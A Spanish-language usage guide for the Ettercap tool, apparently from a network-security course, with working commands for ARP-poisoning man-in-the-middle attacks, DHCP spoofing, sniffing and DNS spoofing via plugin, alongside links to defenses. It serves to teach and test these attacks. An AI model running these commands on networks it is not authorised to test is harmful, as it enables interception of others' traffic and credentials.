# Ettercap - Guía de Uso

## Instalación

```bash
# Linux (Debian/Ubuntu)
sudo apt-get update
sudo apt-get install ettercap-graphical ettercap-text-only

# macOS (Homebrew)
brew install ettercap
```

## Modos de Ejecución

```bash
# Modo texto
sudo ettercap -T

# Modo gráfico
sudo ettercap -G

# Modo curses (ncurses)
sudo ettercap -C
```

## Configuración Inicial

### Seleccionar Interfaz
```bash
# Ver interfaces disponibles
ip link show                    # Linux
ifconfig                        # macOS
networksetup -listallhardwareports  # macOS (más detallado)

# Usar interfaz específica
sudo ettercap -T -i eth0        # Linux
sudo ettercap -T -i en0         # macOS (en0=Ethernet, en1=WiFi)
```

## Ataques con Ettercap

### 1. ARP Poisoning (MITM)

```bash
# Sintaxis
sudo ettercap -T -M arp:remote /TARGET1// /TARGET2//

# Ejemplo: MITM entre PC (192.168.1.10) y Gateway (192.168.1.1)
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# MITM a toda la red
sudo ettercap -T -M arp:remote /// ///
```

### 2. DHCP Spoofing

```bash
# Sintaxis
sudo ettercap -T -M dhcp:IP_POOL/NETMASK/DNS

# Ejemplo: Ofrecer IPs 192.168.1.200-220
sudo ettercap -T -M dhcp:192.168.1.200-220/255.255.255.0/192.168.1.1
```

### 3. Sniffing Pasivo

```bash
# Solo capturar tráfico
sudo ettercap -T -q
```

## Opciones Útiles

| Opción | Descripción |
|--------|-------------|
| `-T` | Modo texto |
| `-G` | Modo gráfico |
| `-M` | MITM attack |
| `-i` | Interfaz |
| `-q` | Quiet (menos output) |
| `-w file` | Guardar captura en archivo |
| `-L logfile` | Guardar log |

## Plugins Útiles

```bash
# Listar plugins
sudo ettercap -T --list-plugins

# Usar plugin
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10// -P dns_spoof
```

### Plugins comunes:
- `dns_spoof`: Spoofing DNS
- `isolate`: Aislar host
- `find_ip`: Descubrir hosts

## Archivos de Configuración

```bash
# Linux
/etc/ettercap/etter.conf  # Configuración principal
/etc/ettercap/etter.dns   # Configuración DNS spoof

# macOS (Homebrew)
/usr/local/etc/ettercap/etter.conf
/usr/local/etc/ettercap/etter.dns
# O en Apple Silicon:
/opt/homebrew/etc/ettercap/etter.conf
```

## Verificación del Ataque

### Desde la víctima
```bash
# Windows
arp -a
# Ver si la MAC del gateway ha cambiado

# Linux
ip neigh show

# macOS
arp -a | grep 192.168.1.1
```

### Desde Wireshark
- Filtro: `arp`
- Buscar ARP replies duplicados/anómalos

## Detener Ataque
```
Ctrl+C o q
```
Ettercap restaura las tablas ARP originales al salir.

---

## Ver también

- [ARP Poisoning](../explotacion/arp_poisoning.md) - Guía de ataque ARP
- [DHCP Attacks](../explotacion/dhcp_attacks.md) - Guía de ataques DHCP
- [ARP Inspection](../../02_configuracion/seguridad/arp_inspection.md) - Defensa contra ARP attacks
- [DHCP Snooping](../../02_configuracion/seguridad/dhcp_snooping.md) - Defensa contra DHCP attacks

---

[← Volver al Índice](../../INDEX.md)
